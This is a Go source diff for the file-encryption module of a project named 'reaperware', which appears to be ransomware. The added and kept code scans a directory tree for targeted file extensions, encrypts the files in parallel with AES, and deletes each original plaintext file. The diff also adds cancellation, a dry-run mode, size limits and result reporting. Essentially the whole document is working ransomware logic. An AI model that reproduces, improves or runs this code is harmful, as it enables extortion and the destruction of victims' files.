@@ -1,13 +1,17 @@
 package filedirectory
 
 import (
+	"context"
 	"log"
 	"os"
-	"reaperware/pkg/aeskeys"
+	"strings"
 	"sync"
+
+	"reaperware/pkg/aeskeys"
+	"reaperware/pkg/config"
 )
 
-// FileTask represents the information needed to encrypt a single file
+// FileTask represents the information needed to encrypt or decrypt a single file.
 type FileTask struct {
 	InputFilePath  string
 	OutputFilePath string
@@ -15,18 +19,32 @@ type FileTask struct {
 }
 
 // encryptFileTask processes a single file encryption task
-func encryptFileTask(task FileTask, aesKey []byte, id int) {
-	// Initialize the Encryptor with file paths
-	fileEncryptor := aeskeys.NewEncryptor(aesKey, task.InputFilePath, task.OutputFilePath, task.DecryptedPath)
+func encryptFileTask(ctx context.Context, task FileTask, aesKey []byte, id int, cfg *config.Run, report *ResultReport) {
+	select {
+	case <-ctx.Done():
+		report.Add(FileOpResult{WorkerID: id, Path: task.InputFilePath, Op: "encrypt", OK: false, Err: ctx.Err(), DryRun: cfg.DryRun})
+		return
+	default:
+	}
 
-	// Perform encryption
+	if cfg.DryRun {
+		log.Printf("[dry-run] [Worker %d] would encrypt: %s\n", id, task.InputFilePath)
+		report.Add(FileOpResult{WorkerID: id, Path: task.InputFilePath, Op: "encrypt", OK: true, DryRun: true})
+		return
+	}
+
+	fileEncryptor := aeskeys.NewEncryptor(aesKey, task.InputFilePath, task.OutputFilePath, task.DecryptedPath)
+	fileEncryptor.MaxPlaintextBytes = cfg.MaxFileSize
+
 	if err := fileEncryptor.Encrypt(id); err != nil {
 		log.Printf("[-] [Worker %d] Failed to encrypt %s: %v\n", id, task.InputFilePath, err)
+		skipped := strings.Contains(err.Error(), "too large")
+		report.Add(FileOpResult{WorkerID: id, Path: task.InputFilePath, Op: "encrypt", OK: false, Err: err, Skipped: skipped, Reason: err.Error(), DryRun: false})
 		return
 	}
 	log.Printf("[+] [Worker %d] File %s encrypted successfully\n", id, task.InputFilePath)
+	report.Add(FileOpResult{WorkerID: id, Path: task.InputFilePath, Op: "encrypt", OK: true, DryRun: false})
 
-	// Delete the original plaintext file
 	err := os.Remove(task.InputFilePath)
 	if err != nil {
 		log.Printf("[-] [Worker %d] Error deleting file %s: %v\n", id, task.InputFilePath, err)
@@ -35,55 +53,78 @@ func encryptFileTask(task FileTask, aesKey []byte, id int) {
 	}
 }
 
-// Init decryptor with file paths and perform decryption
-func decryptFileTask(task FileTask, aesKey []byte, id int) {
-	fileDecryptor := aeskeys.NewEncryptor(aesKey, task.InputFilePath, task.OutputFilePath, task.DecryptedPath)
-	fileDecryptor.Decrypt(id)
-	log.Printf("[+] [Worker %d] File %s decrypted successfully\n", id, task.InputFilePath)
-}
-
-// worker is a goroutine that processes FileTask jobs from the jobs channel
-func worker(id int, aesKey []byte, jobs <-chan FileTask, wg *sync.WaitGroup) {
+func workerEncrypt(ctx context.Context, id int, aesKey []byte, jobs <-chan FileTask, wg *sync.WaitGroup, cfg *config.Run, report *ResultReport) {
 	defer wg.Done()
-	for task := range jobs {
-		log.Printf("[+] [Worker %d] Encrypting file: %s\n", id, task.InputFilePath)
-		encryptFileTask(task, aesKey, id)
+	for {
+		select {
+		case <-ctx.Done():
+			return
+		case task, ok := <-jobs:
+			if !ok {
+				return
+			}
+			log.Printf("[+] [Worker %d] Encrypting file: %s\n", id, task.InputFilePath)
+			encryptFileTask(ctx, task, aesKey, id, cfg, report)
+		}
 	}
 }
 
-// encryptFilesInParallel encrypts multiple files concurrently
-func EncryptFilesInParallel(aesKey []byte, files []FileTask, numWorkers int) {
+// EncryptFilesInParallel encrypts multiple files concurrently with cancellation and reporting.
+func EncryptFilesInParallel(ctx context.Context, aesKey []byte, files []FileTask, cfg *config.Run, report *ResultReport) {
+	if cfg.Workers < 1 {
+		cfg.Workers = 1
+	}
 	var wg sync.WaitGroup
-	jobs := make(chan FileTask, len(files))
+	jobs := make(chan FileTask, minInt(len(files), 1024))
 
-	// Start workers
-	for i := 0; i < numWorkers; i++ {
+	for i := 0; i < cfg.Workers; i++ {
 		wg.Add(1)
-		go worker(i, aesKey, jobs, &wg)
+		go workerEncrypt(ctx, i, aesKey, jobs, &wg, cfg, report)
 	}
 
-	// Send jobs to the channel
+send:
 	for _, file := range files {
-		jobs <- file
+		select {
+		case <-ctx.Done():
+			break send
+		case jobs <- file:
+		}
 	}
-
-	close(jobs) // Close the jobs channel to signal workers that there are no more tasks
-	wg.Wait()   // Wait for all workers to finish
+	close(jobs)
+	wg.Wait()
 }
 
-// Orchestrates the decryption for files
-func DecryptFileTask(aesKey []byte, task FileTask, id int) {
-	decryptor, err := aeskeys.NewAESDecryptor(aesKey, task.InputFilePath)
+// DecryptFileTask runs AES-GCM decryption for one file.
+func DecryptFileTask(ctx context.Context, aesKey []byte, task FileTask, id int, cfg *config.Run, report *ResultReport) {
+	select {
+	case <-ctx.Done():
+		report.Add(FileOpResult{WorkerID: id, Path: task.InputFilePath, Op: "decrypt", OK: false, Err: ctx.Err(), DryRun: cfg.DryRun})
+		return
+	default:
+	}
+
+	if cfg.DryRun {
+		log.Printf("[dry-run] [Worker %d] would decrypt: %s\n", id, task.InputFilePath)
+		report.Add(FileOpResult{WorkerID: id, Path: task.InputFilePath, Op: "decrypt", OK: true, DryRun: true})
+		return
+	}
+
+	decryptor, err := aeskeys.NewAESDecryptor(aesKey, task.InputFilePath, cfg.MaxFileSize)
 	if err != nil {
 		log.Printf("[-] [Worker %d] Failed to initialize decryptor for %s: %v\n", id, task.InputFilePath, err)
+		skipped := strings.Contains(err.Error(), "too large")
+		report.Add(FileOpResult{WorkerID: id, Path: task.InputFilePath, Op: "decrypt", OK: false, Err: err, Skipped: skipped, DryRun: false})
 		return
 	}
 	if err := decryptor.DecryptFile(task.DecryptedPath, id); err != nil {
 		log.Printf("[-] [Worker %d] Failed to decrypt %s: %v\n", id, task.InputFilePath, err)
+		skipped := strings.Contains(err.Error(), "too large")
+		report.Add(FileOpResult{WorkerID: id, Path: task.InputFilePath, Op: "decrypt", OK: false, Err: err, Skipped: skipped, DryRun: false})
 		return
 	}
 
-	// Delete the original plaintext file
+	report.Add(FileOpResult{WorkerID: id, Path: task.InputFilePath, Op: "decrypt", OK: true, DryRun: false})
+
 	err = os.Remove(task.InputFilePath)
 	if err != nil {
 		log.Printf("[-] [Worker %d] Error deleting file %s: %v\n", id, task.InputFilePath, err)
@@ -92,49 +133,68 @@ func DecryptFileTask(aesKey []byte, task FileTask, id int) {
 	}
 }
 
-// Processes decryption tasks from the jobs channel
-func workerDecrypt(id int, aesKey []byte, jobs <-chan FileTask, wg *sync.WaitGroup) {
+func workerDecrypt(ctx context.Context, id int, aesKey []byte, jobs <-chan FileTask, wg *sync.WaitGroup, cfg *config.Run, report *ResultReport) {
 	defer wg.Done()
-	for task := range jobs {
-		log.Printf("[Worker %d] Decrypting file: %s\n", id, task.InputFilePath)
-		DecryptFileTask(aesKey, task, id)
+	for {
+		select {
+		case <-ctx.Done():
+			return
+		case task, ok := <-jobs:
+			if !ok {
+				return
+			}
+			log.Printf("[Worker %d] Decrypting file: %s\n", id, task.InputFilePath)
+			DecryptFileTask(ctx, aesKey, task, id, cfg, report)
+		}
 	}
 }
 
-// Decrypts multiple files concurrently
-func DecryptFilesInParallel(aesKey []byte, files []FileTask, numWorkers int) {
+// DecryptFilesInParallel decrypts multiple files concurrently.
+func DecryptFilesInParallel(ctx context.Context, aesKey []byte, files []FileTask, cfg *config.Run, report *ResultReport) {
+	if cfg.Workers < 1 {
+		cfg.Workers = 1
+	}
 	var wg sync.WaitGroup
-	jobs := make(chan FileTask, len(files))
+	jobs := make(chan FileTask, minInt(len(files), 1024))
 
-	// Start workers
-	for i := 0; i < numWorkers; i++ {
+	for i := 0; i < cfg.Workers; i++ {
 		wg.Add(1)
-		go workerDecrypt(i, aesKey, jobs, &wg)
+		go workerDecrypt(ctx, i, aesKey, jobs, &wg, cfg, report)
 	}
 
-	// Send jobs to the channel
+send:
 	for _, file := range files {
-		jobs <- file
+		select {
+		case <-ctx.Done():
+			break send
+		case jobs <- file:
+		}
 	}
-
-	close(jobs) // Close the channel to signal no more tasks
-	wg.Wait()   // Wait for all workers to finish
+	close(jobs)
+	wg.Wait()
 }
 
-// Find files and encrypt them
-func EncryptTheFiles(rootDir string, aesKey []byte) {
-	// Create and run FileScanner
-	fileScanner := NewFileScanner(rootDir, Extensions, ExcludedDirs)
-	fileScanner.Start()
+// EncryptTheFiles finds files under rootDir and encrypts them.
+func EncryptTheFiles(ctx context.Context, rootDir string, aesKey []byte, cfg *config.Run, report *ResultReport) error {
+	fileScanner := NewFileScanner(rootDir, Extensions, ExcludedDirs, cfg.MaxFileSize)
+	fileScanner.Start(ctx)
+	if err := ctx.Err(); err != nil {
+		return err
+	}
 
-	// Convert scanned files to FileTask slice
 	fileTasks := fileScanner.ToFileTasks()
+	EncryptFilesInParallel(ctx, aesKey, fileTasks, cfg, report)
 
-	// Number of workers to process files concurrently
-	numWorkers := 5
+	if err := ctx.Err(); err != nil {
+		return err
+	}
+	log.Println("[+] Encryption pass finished.")
+	return nil
+}
 
-	// Encrypt files in parallel
-	EncryptFilesInParallel(aesKey, fileTasks, numWorkers)
-
-	log.Println("[+] All files encrypted successfully!")
+func minInt(a, b int) int {
+	if a < b {
+		return a
+	}
+	return b
 }
